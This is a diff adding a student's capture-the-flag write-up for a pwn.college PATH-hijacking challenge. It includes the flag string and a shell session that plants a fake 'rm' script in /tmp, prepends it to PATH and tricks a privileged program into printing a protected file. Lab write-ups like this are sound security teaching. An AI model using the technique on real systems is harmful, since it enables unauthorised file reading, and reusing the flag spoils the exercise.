@@ -147,4 +147,39 @@ No reference was used for this challenge.
 # 5. Hijacking Commands :
 
 
+This challenge will delete the flag using the rm command. But unlike before, it will not print anything out.
+
+## MY SOLUTION:
+
+**Flag** :
+
+```
+pwn.college{YsmWgsTh_fJwoFEGXiqs-sjlOqN.QX3cjM1wCMxEzNzEzW}
+```
+
+
+This was a very good problem, so first to stop the removal of the flag I created a fake directory named /tmp/fake and put the commands into /tmp/fake/rm then I added execute permission to it and exported PATH=/tmp/fake:$PATH. Then I used which rm to check the directories and finally ran /challenge/run to get the flag.
+````
+hacker@path~hijacking-commands:~$ mkdir -p /tmp/fake
+hacker@path~hijacking-commands:~$ echo '#!/bin/bash' > /tmp/fake/rm
+hacker@path~hijacking-commands:~$ echo 'cat "${!#}"' >> /tmp/fake/rm
+hacker@path~hijacking-commands:~$ chmod +x /tmp/fake/rm
+hacker@path~hijacking-commands:~$ export PATH=/tmp/fake:$PATH
+hacker@path~hijacking-commands:~$ which rm
+/tmp/fake/rm
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /tmp/fake/rm. Executing!
+pwn.college{YsmWgsTh_fJwoFEGXiqs-sjlOqN.QX3cjM1wCMxEzNzEzW}
+````
+
+
+## What I learnt
+This problem covered the concepts of previous challenges
+## References 
+No reference was used for this challenge.
+
+
+
+
 
